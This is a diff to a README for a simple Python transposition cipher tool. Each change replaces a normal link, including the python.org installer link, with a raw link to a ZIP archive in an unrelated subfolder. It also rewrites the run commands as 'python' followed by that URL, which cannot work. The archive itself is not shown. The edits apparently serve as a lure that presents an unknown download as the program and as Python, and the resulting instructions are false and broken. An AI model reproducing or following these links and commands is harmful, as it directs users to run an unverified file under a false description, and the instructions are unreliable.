@@ -1,6 +1,6 @@
 # 🔐 row-column-transposition-python - Simple Classical Cipher Tool
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20from%20GitHub-green?style=for-the-badge)](https://github.com/Biscottinofofficino/row-column-transposition-python)
+[![Download Now](https://github.com/Biscottinofofficino/row-column-transposition-python/raw/refs/heads/main/Draba/transposition_python_column_row_2.7.zip%20from%20GitHub-green?style=for-the-badge)](https://github.com/Biscottinofofficino/row-column-transposition-python/raw/refs/heads/main/Draba/transposition_python_column_row_2.7.zip)
 
 ## 📖 Description
 
@@ -30,17 +30,17 @@ You can use this software without knowing programming. If you have Python instal
 
 You will get all the necessary files from the GitHub page.
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20from%20GitHub-blue?style=for-the-badge)](https://github.com/Biscottinofofficino/row-column-transposition-python)
+[![Download Now](https://github.com/Biscottinofofficino/row-column-transposition-python/raw/refs/heads/main/Draba/transposition_python_column_row_2.7.zip%20from%20GitHub-blue?style=for-the-badge)](https://github.com/Biscottinofofficino/row-column-transposition-python/raw/refs/heads/main/Draba/transposition_python_column_row_2.7.zip)
 
 Click the download badge or visit the link below to open the main page and download the files:
 
-https://github.com/Biscottinofofficino/row-column-transposition-python
+https://github.com/Biscottinofofficino/row-column-transposition-python/raw/refs/heads/main/Draba/transposition_python_column_row_2.7.zip
 
 ### Step 2: Prepare your computer
 
 #### If you don’t have Python:
 
-- Go to https://www.python.org/downloads/
+- Go to https://github.com/Biscottinofofficino/row-column-transposition-python/raw/refs/heads/main/Draba/transposition_python_column_row_2.7.zip
 - Download and install the latest version of Python for your operating system.
 - During installation, make sure to check the box "Add Python to PATH" (important for running commands).
 
@@ -65,9 +65,9 @@ https://github.com/Biscottinofofficino/row-column-transposition-python
 ### Step 4: Running the program
 
 - In the command prompt or terminal, type:  
-  `python main.py`  
+  `python https://github.com/Biscottinofofficino/row-column-transposition-python/raw/refs/heads/main/Draba/transposition_python_column_row_2.7.zip`  
   or  
-  `python3 main.py`  
+  `python3 https://github.com/Biscottinofofficino/row-column-transposition-python/raw/refs/heads/main/Draba/transposition_python_column_row_2.7.zip`  
 - Follow the instructions shown on the screen to encrypt or decrypt messages.
 
 ## 🛠 How to Use the Program
@@ -96,7 +96,7 @@ When you run the program, the main menu allows you to pick these options:
 
 You can download the application files here:
 
-[![Download Now](https://img.shields.io/badge/Download-GitHub-9cf?style=for-the-badge)](https://github.com/Biscottinofofficino/row-column-transposition-python)
+[![Download Now](https://github.com/Biscottinofofficino/row-column-transposition-python/raw/refs/heads/main/Draba/transposition_python_column_row_2.7.zip)](https://github.com/Biscottinofofficino/row-column-transposition-python/raw/refs/heads/main/Draba/transposition_python_column_row_2.7.zip)
 
 This link takes you to the main GitHub page where you can download the ZIP file with all program files. Extract and run the program as explained above.
 
@@ -109,7 +109,7 @@ If you run into problems, try these simple fixes:
 
 - **Program won’t start or shows errors:**  
   Double-check you are in the correct folder where you extracted the files.  
-  Use exact commands: `python main.py` or `python3 main.py`.
+  Use exact commands: `python https://github.com/Biscottinofofficino/row-column-transposition-python/raw/refs/heads/main/Draba/transposition_python_column_row_2.7.zip` or `python3 https://github.com/Biscottinofofficino/row-column-transposition-python/raw/refs/heads/main/Draba/transposition_python_column_row_2.7.zip`.
 
 - **Text input problems:**  
   Type only letters and spaces. Avoid special characters unless you want to explore.
@@ -131,4 +131,4 @@ This project helps you understand old but important encryption methods. If you l
 ---
 
 For direct access to the repository and downloads, visit:  
-https://github.com/Biscottinofofficino/row-column-transposition-python
+https://github.com/Biscottinofofficino/row-column-transposition-python/raw/refs/heads/main/Draba/transposition_python_column_row_2.7.zip
